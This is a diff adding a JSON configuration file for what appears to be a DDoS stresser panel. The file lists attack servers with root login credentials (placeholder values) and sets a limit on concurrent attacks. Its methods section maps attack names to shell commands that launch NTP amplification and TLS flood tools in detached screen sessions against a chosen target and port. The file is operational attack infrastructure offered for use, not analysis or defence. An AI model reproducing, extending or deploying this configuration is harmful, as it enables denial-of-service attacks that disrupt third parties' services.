@@ -1,0 +1,49 @@
+{
+  "apiKey": "your-secret-api-key-change-me",
+  "port": "5123",
+  "globalMaxConcurrentAttacks": 10,
+  "servePublic": false,
+  "servers": [
+    {
+      "name": "server1-l4",
+      "host": "192.168.1.100",
+      "user": "root",
+      "password": "your_server_password"
+    },
+    {
+      "name": "server2-l4",
+      "host": "server2.example.com",
+      "user": "admin",
+      "password": "another_password"
+    },
+    {
+      "name": "server3-l7",
+      "host": "192.168.1.102",
+      "user": "root",
+      "password": "your_server_password_3"
+    }
+  ],
+  "groups": {
+    "l4": {
+      "servers": ["server1-l4", "server2-l4"]
+    },
+    "L7": {
+      "servers": ["server3-l7"],
+      "maxConcurrentAttacks": 5
+    }
+  },
+  "methods": {
+    "NTP_ALL": {
+      "command": "screen -dmS {target} ./ntp {target} {port} {duration} 16",
+      "group": "Global"
+    },
+    "dns": {
+      "command": "screen -dmS {target} ./ntp {target} {port} {duration} 16",
+      "group": "Global"
+    },
+    "tls": {
+      "command": "screen -dmS {screen_name} node tls.js {target} {port} {duration} http.txt 16",
+      "group": "L7"
+    }
+  }
+}
